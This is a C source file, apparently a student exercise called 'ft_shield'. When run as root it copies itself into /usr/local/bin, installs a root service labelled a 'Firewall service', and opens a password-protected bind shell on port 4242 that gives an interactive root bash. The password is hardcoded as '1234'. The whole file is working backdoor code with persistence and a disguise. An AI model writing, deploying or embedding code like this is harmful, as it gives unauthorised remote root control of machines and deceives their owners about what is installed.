#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pty.h>

#define TARGET_PATH "/usr/local/bin/ft_shield"
#define SERVICE_PATH_SYSTEMD "/etc/systemd/system/ft_shield.service"
#define SERVICE_PATH_SYSVINIT "/etc/init.d/ft_shield"
#define PORT 4242
#define PASSWORD "1234"

int use_systemd()
{
    return access("/run/systemd/system", F_OK) == 0;
}

void copy_to_standard_location()
{
    char buffer[1024];
    ssize_t bytes_read, bytes_written;
    
    int source_fd = open("/proc/self/exe", O_RDONLY);
    if (source_fd < 0)
    {
        perror("Failed to open source binary");
        exit(EXIT_FAILURE);
    }

    int target_fd = open(TARGET_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (target_fd < 0)
    {
        perror("Failed to open target path");
        close(source_fd);
        exit(EXIT_FAILURE);
    }

    while ((bytes_read = read(source_fd, buffer, sizeof(buffer))) > 0)
    {
        bytes_written = write(target_fd, buffer, bytes_read);
        if (bytes_written != bytes_read)
        {
            perror("Failed to write complete data");
            close(source_fd);
            close(target_fd);
            exit(EXIT_FAILURE);
        }
    }

    close(source_fd);
    close(target_fd);
}

void create_service_file(int systemd_enabled)
{
    const char *service_content_systemd =
        "[Unit]\n"
        "Description=FT Shield Firewall service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "ExecStart=/usr/local/bin/ft_shield\n"
        "Restart=on-failure\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    const char *service_content_sysvinit =
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          ft_shield\n"
        "# Required-Start:    $network\n"
        "# Required-Stop:     $network\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:      0 1 6\n"
        "# Short-Description: FT Shield Firewall service\n"
        "### END INIT INFO\n"
        "\n"
        "case \"$1\" in\n"
        "    start)\n"
        "        /usr/local/bin/ft_shield &\n"
        "        ;;\n"
        "    stop)\n"
        "        killall ft_shield\n"
        "        ;;\n"
        "    *)\n"
        "        echo \"Usage: $0 {start|stop}\"\n"
        "        exit 1\n"
        "esac\n"
        "exit 0\n";

    const char *service_path = systemd_enabled ? SERVICE_PATH_SYSTEMD : SERVICE_PATH_SYSVINIT;
    const char *service_content = systemd_enabled ? service_content_systemd : service_content_sysvinit;

    int fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0)
    {
        perror("Failed to create service file");
        exit(EXIT_FAILURE);
    }

    write(fd, service_content, strlen(service_content));
    close(fd);
}

void setup_service(int systemd_enabled)
{
    if (systemd_enabled)
    {
        system("systemctl daemon-reload");
        system("systemctl enable ft_shield");
        system("systemctl start ft_shield");
    }
    else
    {
        system("chmod +x /etc/init.d/ft_shield");
        system("service ft_shield start");
    }
}

void uninstall_service(int systemd_enabled)
{
    system("ps aux | grep '[f]t_shield' | awk '{print $2}' | xargs kill -9 2>/dev/null 1>/dev/null");

    if (systemd_enabled)
    {
        system("systemctl stop ft_shield");
        system("systemctl disable ft_shield");
        if (remove(SERVICE_PATH_SYSTEMD) == 0)
        {
            printf("Systemd service file removed successfully.\n");
        }
        else
        {
            perror("Failed to remove systemd service file");
        }
        system("systemctl daemon-reload");
    }
    else
    {
        system("service ft_shield stop");
        if (remove(SERVICE_PATH_SYSVINIT) == 0)
        {
            printf("SysVinit service file removed successfully.\n");
        }
        else
        {
            perror("Failed to remove SysVinit service file");
        }
    }

    if (remove(TARGET_PATH) == 0)
    {
        printf("Binary removed successfully.\n");
    }
    else
    {
        perror("Failed to remove binary");
    }
}

void handle_client(int client_socket)
{
    char buffer[1024];
    int authenticated = 0;

    send(client_socket, "Password: ", 10, 0);
    int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    buffer[bytes_received - 1] = '\0';

    if (strcmp(buffer, PASSWORD) == 0)
    {
        authenticated = 1;
        send(client_socket, "Authentication successful.\n", 26, 0);
    }
    else
    {
        send(client_socket, "Authentication failed.\n", 23, 0);
        close(client_socket);
        return;
    }

    if (authenticated)
    {
        int master_fd;
        pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);  // Create a PTY for the child process
        if (pid == -1)
        {
            perror("forkpty failed");
            close(client_socket);
            return;
        }

        if (pid == 0)
        {
            setenv("TERM", "xterm-256color", 1);
            execl("/bin/bash", "/bin/bash", "-i", NULL);
            perror("execl failed");
            exit(EXIT_FAILURE);
        }
        else
        {
            fd_set fds;
            while (1)
            {
                FD_ZERO(&fds);
                FD_SET(client_socket, &fds);
                FD_SET(master_fd, &fds);

                if (select(master_fd + 1, &fds, NULL, NULL, NULL) < 0)
                {
                    perror("select failed");
                    break;
                }

                if (FD_ISSET(master_fd, &fds))
                {
                    int n = read(master_fd, buffer, sizeof(buffer));
                    if (n <= 0) break;
                    send(client_socket, buffer, n, 0);
                }

                if (FD_ISSET(client_socket, &fds))
                {
                    int n = recv(client_socket, buffer, sizeof(buffer), 0);
                    if (n <= 0) break;
                    write(master_fd, buffer, n);
                }
            }
            close(master_fd);
        }
    }

    close(client_socket);
}



void daemon_main()
{
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_size = sizeof(client_addr);

    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
    {
        perror("Bind failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    if (listen(server_socket, 3) == -1)
    {
        perror("Listen failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_size);
        if (client_socket == -1)
        {
            perror("Accept failed");
            continue;
        }
        handle_client(client_socket);
    }

    close(server_socket);
}

char* get_username()
{
    char *user = getenv("USER");
    if (user)
    {
        return user;
    }

    struct passwd *pw = getpwuid(getuid());
    if (pw)
    {
        return pw->pw_name;
    }

    return "Unknown";
}

int main(int argc, char *argv[])
{
    /* this goes first so i give the user no data about the program itself. s*/
    if (geteuid() != 0)
    {
        fprintf(stderr, "This program requires root privileges.\n");
        return -1;
    }

    int systemd_enabled = use_systemd();

    if (argc > 1 && strcmp(argv[1], "--uninstall") == 0)
    {
        uninstall_service(systemd_enabled);
        return 0;
    }
    else if (argc > 1)
    {
        fprintf(stderr, "Usage: %s [--uninstall]\n", argv[0]);
        return -1;
    }
    

    char *user = get_username();
    printf("%s\n", user);

    if (access(TARGET_PATH, F_OK) != 0)
    {
        copy_to_standard_location();
    }

    create_service_file(systemd_enabled);

    setup_service(systemd_enabled);

    if (fork() == 0)
    {
        daemon_main();
    }

    return 0;
}
